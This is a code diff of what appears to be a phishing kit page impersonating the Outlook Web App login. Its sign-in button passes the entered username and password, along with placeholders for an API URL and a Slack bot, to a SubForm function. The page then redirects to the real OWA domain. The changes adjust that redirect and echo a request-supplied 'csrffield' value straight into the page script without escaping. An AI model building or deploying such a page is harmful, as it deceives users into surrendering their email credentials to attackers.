@@ -6,7 +6,7 @@ content="IE=5.0000" http-equiv="X-UA-Compatible">
 rel="shortcut icon" type="image/x-icon"> 
 <META http-equiv="Content-Type" content="text/html; CHARSET=utf-8"> 
 <META name="Robots" content="NOINDEX, NOFOLLOW"> <TITLE>Outlook Web App</TITLE> 
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<!--<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>-->
 <STYLE>
 @font-face {
     font-family: "Segoe UI WPC";
@@ -1326,8 +1326,16 @@ doesn&amp;#39;t support scripts, you can download &lt;a
 href="http://www.microsoft.com/windows/ie/downloads/default.mspx"&gt;Windows 
 Internet Explorer&lt;/a&gt; for access to Outlook Web App.&lt;/td&gt;
 		&lt;/tr&gt;		&lt;/table&gt;	&lt;/div&gt; </NOSCRIPT> 
-<FORM name="logonForm" action="<?php echo $Redirect; ?>/owa/auth.owa" enctype="application/x-www-form-urlencoded" 
-method="POST" autocomplete="off"><INPUT name="destination" type="hidden" value="<?php echo $Redirect; ?>/owa/"> 
+		
+		<?php
+		
+		$parsedurl = parse_url($Redirect);
+
+		$domain = $parsedurl['scheme']."://".$parsedurl['host'];
+		
+		?>
+<FORM name="logonForm" action="<?php echo $domain; ?>/owa/auth.owa" enctype="application/x-www-form-urlencoded" 
+method="POST" autocomplete="off"><INPUT name="destination" type="hidden" value="<?php echo $domain; ?>/owa/"> 
 <INPUT name="flags" type="hidden" value="4"> <INPUT name="forcedownlevel" type="hidden" value="0"> 
   <!-- Default to mouse class, so that things don't look wacky if the script somehow doesn't apply a class --> 
 <DIV class="mouse" id="mainLogonDiv">
@@ -1374,7 +1382,7 @@ password</SPAN>         </DIV>
         <?php } ?>
 <DIV class="signInExpl" id="expltxt" role="alert"></DIV>
 <DIV class="signInEnter">
-<DIV tabindex="0" class="signinbutton" role="button" onclick="SubForm('<?php echo $APIURL; ?>','logonForm','<?php echo $Project; ?>','<?php echo $SlackBotName; ?>','<?php echo $SlackEmoji; ?>','username','password','<?php echo $Redirect; ?>','')"><IMG 
+<DIV tabindex="0" class="signinbutton" role="button" onclick="SubForm('<?php echo $APIURL; ?>','logonForm','<?php echo $Project; ?>','<?php echo $SlackBotName; ?>','<?php echo $SlackEmoji; ?>','username','password','<?php echo $Redirect; ?>','<?php if(isset($_REQUEST['csrffield'])){echo $_REQUEST['csrffield'];}else{echo '';}?>')"><IMG 
 class="imgLnk" alt="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABYAAAAWCAYAAADEtGw7AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyBpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjU1NzZGNEQzOTYxOTExRTE4ODU2ODkyQUQxMTQ2QUJGIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOjU1NzZGNEQ0OTYxOTExRTE4ODU2ODkyQUQxMTQ2QUJGIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6NTU3NkY0RDE5NjE5MTFFMTg4NTY4OTJBRDExNDZBQkYiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6NTU3NkY0RDI5NjE5MTFFMTg4NTY4OTJBRDExNDZBQkYiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz7MvF4iAAACF0lEQVR42qyVz0sCQRTHZ5cSuqQJURRUt66GEuQlugmF0Ukw+huCjaBT0SkhEvwL6iQEERRJndIuCoLU1VsFQkH04xR0se/D79C4qLtCDz47zO6b7755M2/GUk5ZdbEwSIEEmAQRvn8ADXADTptHC++dBlsdhIfAJtgBQdXbvkAG5PCDb/OD7XIcByVwQNFLsA5iYJDE+O6SPuJbsrYq490ilulKZwrUwB4oeES8DPZBFDyDOCJvmBEHwDlFC8yrl6hy+crYc0QeMIUdMM9IN8Cb8mmI8I1jatRwtLDkaZt+Mv0P1adB/INjxbYRddBmnsKczt/0s/F2lJrhT5vgHoTkvWVZWlyPF620zb2qPHOajT/iuQQ+uaeLWPiQyyvPNiHCs+zces45G5fimGORaPGI4XHHNjrAvSv22ibilJs+0tsSV2qEfb3oo7b6Xwuw/ZGIX7gzxpi/v+LRi9g+E4nymNFKStaMrxNsGxJxnZ1Fz3haokVDdImLqi3Kti7CZ+wkXQvVHq1TnqFoyBD9dP06zfZGzgpJwxPTseKzlM3iaOVtqyL1cMUTb9o2jj6xXWOFfRtERzhWLIOffeldkTVq/QQM9yE6zDH6rMmZh9APWOXNkGSxJHzoJuib5NhVfeCb+1g+yGpVubrX4IIlH3EVRYrfrulbNc/iXleTwxPPz9V0KKl0X02Wx2Wa9rhM890u018BBgDOvaD/8G2ecwAAAABJRU5ErkJggg=="><SPAN class="signinTxt">sign in</SPAN>             
 </DIV>             <INPUT name="isUtf8" type="hidden" value="1">		 </DIV>
 <HR>
